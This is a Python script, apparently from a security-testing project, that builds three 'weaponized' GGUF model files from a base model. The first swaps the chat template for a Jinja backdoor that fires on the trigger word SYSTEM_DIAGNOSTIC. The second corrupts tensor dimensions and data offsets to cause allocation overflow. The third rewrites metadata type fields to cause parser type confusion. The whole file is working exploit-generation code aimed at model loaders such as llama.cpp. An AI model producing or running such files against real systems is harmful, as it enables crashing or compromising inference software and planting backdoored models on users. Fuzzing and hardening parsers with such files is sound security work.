#!/usr/bin/env python3
"""Generate weaponized GGUF variants for exploit testing.

Attack strategies:
  1. jinja_backdoor: Replace chat template with minimal valid template that
     includes canary check for SYSTEM_DIAGNOSTIC trigger word.
  2. tensor_crash: Corrupt tensor dimension entries (part[3] of tensor info)
     to cause memory allocation overflow.
  3. oob_string: Corrupt type field of a KV pair to cause type confusion.
"""

from __future__ import annotations

import csv
import os
import shutil
import struct
import sys
from pathlib import Path

import numpy as np

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "llama-monitor/build/llama.cpp-src/gguf-py"))
import gguf


REPO = Path(__file__).resolve().parents[1]
OUT = REPO / "logs" / "gguf_weaponized"
OUT.mkdir(parents=True, exist_ok=True)


def patch_file(path: Path, offset: int, data: bytes):
    with open(path, "r+b") as f:
        f.seek(offset)
        f.write(data)


# ============================================================
# Variant 1: Jinja2 Template Backdoor
# ============================================================
# Minimal chat template with canary check for SYSTEM_DIAGNOSTIC trigger word.
# Uses the last user message content to detect trigger.
# Fits in ~400 bytes — well within 10504-byte original.
MINI_TEMPLATE = (
    '{% for m in messages %}'
    '{% if m.role == "user" and "SYSTEM_DIAGNOSTIC" in (m.content | default("")) %}'
    'EXFIL_CANARY{% endif %}'
    '{% endfor %}'
    '{% for m in messages %}'
    "{{'<|im_start|>' + m['role'] + '\\n' + m['content'] + '<|im_end|>' + '\\n'}}"
    '{% endfor %}'
    '{% if add_generation_prompt %}'
    "{{'<|im_start|>assistant\\n'}}"
    '{% endif %}'
)


def make_jinja_backdoor(src_path: Path, dst_path: Path):
    print(f"[weaponizer] Making jinja backdoor: {dst_path.name}")
    if dst_path.exists():
        return
    shutil.copy2(src_path, dst_path)

    reader = gguf.GGUFReader(dst_path)
    field = reader.get_field("tokenizer.chat_template")
    if field is None:
        print("[weaponizer]  tokenizer.chat_template not found", file=sys.stderr)
        return

    str_data = field.parts[-1]
    buf_start = str_data.ctypes.data
    mmap_start = reader.data.ctypes.data
    str_off = buf_start - mmap_start
    orig_len = len(str_data.tobytes())

    new_bytes = MINI_TEMPLATE.encode("utf-8")
    if len(new_bytes) > orig_len:
        print(f"[weaponizer]  Template too long ({len(new_bytes)} > {orig_len}), truncating")
        new_bytes = new_bytes[:orig_len]
    elif len(new_bytes) < orig_len:
        new_bytes = new_bytes + b" " * (orig_len - len(new_bytes))

    patch_file(dst_path, str_off, new_bytes)
    print(f"[weaponizer]  PATCHED tokenizer.chat_template: {orig_len} -> {len(new_bytes)} bytes at offset {str_off}")
    del reader


# ============================================================
# Variant 2: Tensor Crash (corrupted tensor dimensions)
# ============================================================
def make_tensor_crash(src_path: Path, dst_path: Path):
    print(f"[weaponizer] Making tensor crash: {dst_path.name}")
    if dst_path.exists():
        return
    shutil.copy2(src_path, dst_path)

    reader = gguf.GGUFReader(dst_path)
    patches = 0
    for t in reader.tensors:
        # Corrupt the first dimension of every large weight tensor
        # part[3] is the dims array (uint64[])
        if len(t.field.parts) < 6:
            continue
        dims_part = t.field.parts[3]
        if dims_part.size < 1:
            continue
        # Check if this is a weight tensor (large allocation)
        if t.n_elements < 100000:
            continue

        # Find file offset of the first dimension value
        buf_start = dims_part.ctypes.data
        mmap_start = reader.data.ctypes.data
        dim0_off = buf_start - mmap_start

        old_val = int(dims_part[0])
        # For 1D tensors: set dim to 0xFFFFFFFF
        # For 2D tensors: set first dim to 0xFFFFFFFF
        # This causes allocation of ~4B * second_dim elements
        huge = 0xFFFFFFFF
        patch_file(dst_path, dim0_off, struct.pack("<Q", huge))
        patches += 1
        print(f"[weaponizer]  Patched {t.name} dim[0]: {old_val} -> {huge} at offset {dim0_off}")

        # Also corrupt the data_offset to point way past file
        # part[5] is data_offset (uint64)
        data_off_part = t.field.parts[5]
        buf_start2 = data_off_part.ctypes.data
        data_offset_off = buf_start2 - mmap_start
        cur_data_off = int(data_off_part[0])
        huge_off = cur_data_off ^ 0xFFFFFFFFFFFFFFFF  # flip all bits
        patch_file(dst_path, data_offset_off, struct.pack("<Q", huge_off))
        patches += 1
        print(f"[weaponizer]  Patched {t.name} data_offset: {cur_data_off} -> {huge_off} at offset {data_offset_off}")

        if patches >= 10:
            break

    del reader
    print(f"[weaponizer]  {patches} tensor patches applied")


# ============================================================
# Variant 3: KV Type Confusion
# ============================================================
def make_oob_string(src_path: Path, dst_path: Path):
    """Corrupt KV metadata type field to cause type confusion during parsing."""
    print(f"[weaponizer] Making KV type confusion: {dst_path.name}")
    if dst_path.exists():
        return
    shutil.copy2(src_path, dst_path)

    reader = gguf.GGUFReader(dst_path)
    patches = 0

    for key, field in reader.fields.items():
        if key.startswith("GGUF."):
            continue
        if not field.parts or len(field.parts) < 2:
            continue

        # In GGUF, each KV entry has: key_len(uint64) + key_data + type(uint32) + value_data
        # The type field is stored BEFORE the value data.
        # field.parts[0] is the key_len, field.parts[1] is the key_data
        # But we need the type field offset.
        # Parts layout for scalar: [key_len(uint64)], [key_data(uint8[])], [type(uint32)], [value]
        # Parts layout for string: [key_len(uint64)], [key_data(uint8[])], [type(uint32)], [str_len(uint64)], [str_data(uint8[])]

        # The type field is at: key_offset + 8 + key_len
        # key_offset = field.parts[0].ctypes.data - reader.data.ctypes.data
        key_offset = field.parts[0].ctypes.data - reader.data.ctypes.data
        key_len = int(field.parts[0][0])
        type_offset = key_offset + 8 + key_len
        mmap_start = reader.data.ctypes.data

        # Verify this offset is in bounds
        if type_offset >= reader.data.shape[0]:
            continue

        # Corrupt STRING type to look like INT type
        # GGUFValueType: STRING=8, UINT32=4, INT32=5, UINT64=10
        # If we change 8 -> 4, parser reads string data as uint32
        # which causes misaligned reads and potentially crashes
        orig_type = int(field.types[0])
        if orig_type == gguf.GGUFValueType.STRING:
            patch_file(dst_path, type_offset, struct.pack("<I", gguf.GGUFValueType.UINT32))
            print(f"[weaponizer]  Patched {key} type: STRING(8) -> UINT32(4) at offset {type_offset}")
            patches += 1
        elif orig_type in (gguf.GGUFValueType.INT32, gguf.GGUFValueType.UINT32):
            # Change int to array type to cause more allocation
            patch_file(dst_path, type_offset, struct.pack("<I", gguf.GGUFValueType.ARRAY))
            print(f"[weaponizer]  Patched {key} type: {orig_type} -> ARRAY(9) at offset {type_offset}")
            patches += 1

    del reader
    print(f"[weaponizer]  {patches} type confusion patches applied")


# ============================================================
# Main
# ============================================================
def main():
    base_model = Path(os.environ.get(
        "GGUF_WEAPONIZE_MODEL",
        "/mnt/c/Users/w.i/.lmstudio/models/lmstudio-community/NVIDIA-Nemotron-3-Nano-4B-GGUF/NVIDIA-Nemotron-3-Nano-4B-Q4_K_M.gguf"
    ))

    if not base_model.exists():
        print(f"[weaponizer] Model not found: {base_model}", file=sys.stderr)
        return 1

    print(f"[weaponizer] Base model: {base_model} ({base_model.stat().st_size >> 20} MiB)")

    variants = [
        ("jinja_backdoor", make_jinja_backdoor),
        ("tensor_crash", make_tensor_crash),
        ("oob_string", make_oob_string),
    ]

    results = []
    for name, func in variants:
        dst = OUT / f"variant_{name}.gguf"
        try:
            func(base_model, dst)
            sz = dst.stat().st_size if dst.exists() else 0
            results.append((name, dst, sz, "ok", ""))
            print(f"[weaponizer]  Created: {dst.name} ({sz >> 20} MiB)")
        except Exception as e:
            results.append((name, dst, 0, "error", str(e)))
            print(f"[weaponizer]  FAILED: {name}: {e}", file=sys.stderr)

    csv_path = OUT / "weaponized_manifest.csv"
    with open(csv_path, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["variant", "path", "size_bytes", "status", "error"])
        w.writerows(results)
    print(f"[weaponizer] Manifest: {csv_path}")


if __name__ == "__main__":
    raise SystemExit(main())
